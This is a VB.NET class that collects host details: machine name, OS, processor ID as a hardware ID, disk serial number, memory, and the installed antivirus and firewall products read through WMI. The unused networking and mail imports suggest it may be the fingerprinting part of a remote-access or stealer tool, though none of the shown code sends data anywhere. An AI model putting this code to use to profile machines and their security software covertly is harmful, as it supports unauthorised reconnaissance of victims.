Imports System.Globalization
Imports System.Linq
Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Security.Principal
Imports System.Threading
Imports System.Windows.Forms
Imports System.Net
Imports System.Net.Mail
Imports System.Net.HttpWebRequest
Imports Microsoft.Win32
Imports System.IO
Imports System.Management
Imports System.Text
Public Class info



    '######## GET info ########
    Public PC_Name As String = System.Net.Dns.GetHostName()
    Public OS As String = My.Computer.Info.OSFullName.ToString()
    '######## GET HWID ########
    Public Shared Function HWID() As String
        Dim strProcessorId As String = String.Empty
        Dim query As New SelectQuery("Win32_processor")
        Dim search As New ManagementObjectSearcher(query)
        Dim info As ManagementObject
        For Each info In search.Get()
            strProcessorId = info("processorId").ToString()
        Next
        Return strProcessorId
    End Function



    Public Shared Function SNHD() As String

        Dim val As String = ""
        Dim hdd As New ManagementObjectSearcher("select * from Win32_DiskDrive")
        Try
            For Each hd As ManagementObject In hdd.Get()

                val = hd("SerialNumber").ToString().Trim

                Return val
            Next
        Catch ex As ManagementException
            Return ""
        End Try

        Return val
    End Function

    '########### information device ############
    Public Shared Function GetAntivirus() As String
        Dim GlobalAsync As String = String.Empty
        Try
            Dim computer As String = Environment.MachineName
            Dim wmipath As String = IIf(Environment.OSVersion.Version.Major > 5, "\\" & computer & "\root\SecurityCenter2", "\\" & computer & "\root\SecurityCenter")
            Dim searcher As New Management.ManagementObjectSearcher(wmipath, "SELECT * FROM AntivirusProduct")
            Dim instances As Management.ManagementObjectCollection = searcher.[Get]()
            Dim a As String = "Antiviruses (" & instances.Count.ToString() & "):" & vbCr & vbLf
            For Each queryObj As Management.ManagementObject In instances
                Try
                    a += queryObj("companyName") & " - "
                Catch
                End Try
                Try
                    a &= queryObj("displayName") & vbCr & vbLf
                Catch
                End Try
            Next
            GlobalAsync = a
        Catch
        End Try
        If GlobalAsync.Contains(":") Then
            GlobalAsync = GlobalAsync.Split(CChar(":"))(1).TrimStart().TrimEnd()
        End If
        Return GlobalAsync
    End Function


    Public Shared Function GetFirewall() As String
        Dim str As String = "None"
        Try
            Dim searcher As New Management.ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM FirewallProduct")
            Dim instances As Management.ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As Management.ManagementObject In instances
                str = queryObj("displayName").ToString()
            Next
        Catch
        End Try
        Return str
    End Function

    Public Shared Function GetOS() As String
        Dim OSName As String() = {}
        Dim objOS As Object = New Management.ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem")
        For Each objMgmt As Object In objOS.Get
            OSName = objMgmt("name").ToString().Split("|")
        Next
        Return IIf((OSName(0) IsNot Nothing), OSName(0), "Unknown")
    End Function

    Public Shared Function GetProcessor() As String
        Dim CPU As Object
        Dim DemCPUs As String = String.Empty
        Try
            Dim ohi As Object = GetObject("winmgmts:")
            For Each CPU In ohi.InstancesOf("Win32_Processor")
                DemCPUs &= CPU.Name
            Next
            Return DemCPUs
        Catch
            Return "No Processor was found"
        End Try
    End Function

    Public Shared pc As New Devices.Computer
    Public Shared Function GetMemory() As String
        Dim MemBitSize As String = CStr(pc.Info.TotalPhysicalMemory)
        Select Case CDec(MemBitSize)
            Case 0 To CDec(999.999)
                MemBitSize = Format(CInt(CDec(MemBitSize)), "###,###,###,###,##0 bytes")
            Case 1000 To CDec(999999.999)
                MemBitSize = Format(CInt(CDec(MemBitSize) / 1024), "###,###,###,##0 KB")
            Case 1000000 To CDec(999999999.999)
                MemBitSize = Format(CInt(CDec(MemBitSize) / 1024 / 1024), "###,###,##0 MB")
            Case Is >= 1000000000
                MemBitSize = Format(CInt(CDec(MemBitSize) / 1024 / 1024 / 1024), "#,###.00 GB")
        End Select
        Return MemBitSize
    End Function



End Class
